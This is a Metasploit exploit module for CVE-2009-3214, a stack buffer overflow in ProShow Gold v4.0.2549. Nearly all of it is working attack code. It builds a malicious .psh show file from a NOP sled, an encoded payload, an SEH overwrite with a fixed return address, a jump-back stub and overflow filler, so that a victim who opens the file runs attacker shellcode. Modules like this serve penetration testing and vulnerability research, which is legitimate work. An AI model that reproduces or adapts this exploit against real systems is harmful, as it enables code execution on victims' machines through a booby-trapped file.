##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ProShow Gold v4.0.2549 (PSH File) Stack Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack-based buffer overflow in ProShow Gold v4.0.2549.
        An attacker must send the file to victim and the victim must open the file.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'jduck' ],
      'References'     =>
        [
          [ 'CVE', '2009-3214' ],
          [ 'OSVDB', '57226' ],
          [ 'EDB', '9483' ],
          [ 'EDB', '9519' ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
          'DisablePayloadHandler' => true
        },
      'Payload'        =>
        {
          'Space'    => 1000,
          'BadChars' => "\x00\x0a\x0d",
          'StackAdjustment' => -3500,
        },
      'Platform' => 'win',
      'Targets'        =>
        [
          # 0x01a614ea # p/p/r @ all.dnt
          [ 'Windows Universal', { 'Offset' => 4036, 'Ret' => 0x101a4cf9 } ], # p/p/r if.dnt
        ],
      'Privileged'     => false,
      'DisclosureDate' => '2009-08-20',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [ true, 'The file name.',  'msf.psh']),
      ])
  end

  def exploit

    sploit = make_nops(target['Offset'] - 4 - payload.encoded.length)
    sploit << payload.encoded
    sploit << generate_seh_record(target.ret)

    # note, just in case the arguments get modified, we'll jump back into our buffer...
    sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + target['Offset'].to_s).encode_string

    # cause exception hitting the end of the stack
    sploit << rand_text(1000) * 13

    content = "Photodex(R) ProShow(TM) Show File Version=0\r\n"
    content << "cells=1\r\n"
    content << "cell[0].nrOfImages=1\r\n"
    content << "cell[0].images[0].image=" << sploit << "\r\n"

    print_status("Creating '#{datastore['FILENAME']}' file ...")
    file_create(content)

  end
end
